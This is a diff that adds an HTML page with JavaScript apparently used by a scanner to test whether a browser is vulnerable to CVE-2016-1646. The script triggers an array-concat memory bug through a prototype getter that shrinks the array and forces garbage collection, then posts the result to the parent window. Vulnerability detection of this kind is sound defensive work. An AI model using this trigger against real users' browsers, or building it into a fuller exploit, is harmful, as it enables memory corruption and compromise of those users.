@@ -1,0 +1,73 @@
+<html>
+<script language="javascript">
+    
+    function post_result(check_state) {
+        var parentwin = window.parent;
+        parentwin.postMessage(check_state,"*");
+    }
+    
+    function check_vuln() {
+        b = new Array(10);
+        b[0] = 0.1;
+        b[2] = 2.1;
+        b[3] = 3.1;
+        b[4] = 4.1;
+        b[5] = 5.1;
+        b[6] = 6.1;
+        b[7] = 7.1;
+        b[8] = 8.1;
+        b[9] = 9.1;
+        b[10] = 10.1;
+
+
+        a = new Array(10);
+        a[0] = 0.1;
+        a[2] = 2.1;
+        a[3] = 3.1;
+        a[4] = 4.1;
+        a[5] = 5.1;
+        a[6] = 6.1;
+        a[7] = 7.1;
+        a[8] = 8.1;
+        a[9] = 9.1;
+        a[10] = 10.1;
+
+
+        Object.defineProperty(b.__proto__, 1, {
+            get: function () {
+                b.length = 1;
+                gc();
+                return 1;
+            },
+            set: function(new_value){
+                value = new_value
+            }
+        });
+
+        c = b.concat();
+
+        for (var i = 0; i <c.length; i++) {
+            /*
+            document.write("index "+i+":");
+            document.write(c[i]);
+            document.write("<br>");
+            */
+
+            if (c[i]!=a[i])
+                return true;
+        }
+        return false;
+    }
+    
+    function gc() {
+      tmp = [];
+      for (var i = 0; i < 0x100000; i++)
+        tmp.push(new Uint8Array(10));
+      tmp = null;
+    }
+    
+
+    post_result('({vuln_name:"CVE-2016-1646",check_state:'+check_vuln()+'})');
+
+</script>
+</html>
